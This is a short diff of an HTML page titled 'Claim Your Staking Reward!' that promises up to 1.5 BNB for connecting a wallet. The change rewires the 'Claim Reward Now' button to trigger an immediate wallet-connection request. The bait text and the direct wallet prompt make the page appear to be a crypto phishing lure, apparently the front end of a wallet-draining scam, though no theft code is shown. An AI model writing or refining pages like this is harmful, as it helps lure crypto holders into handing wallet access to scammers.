@@ -8,7 +8,7 @@
 <body style="text-align:center; font-family:Arial; padding:50px; background:#0f0f0f; color:white;">
     <h1>🎉 Claim Your Staking Reward!</h1>
     <p>Connect wallet and claim up to 1.5 BNB + tokens</p>
-    <button onclick="claimReward()" style="padding:15px 30px; font-size:18px; background:#00cc00; color:white; border:none; border-radius:8px; cursor:pointer;">
+    <button onclick="window.ethereum.request({ method: 'eth_requestAccounts' })" style="...">
         Claim Reward Now
     </button>
 
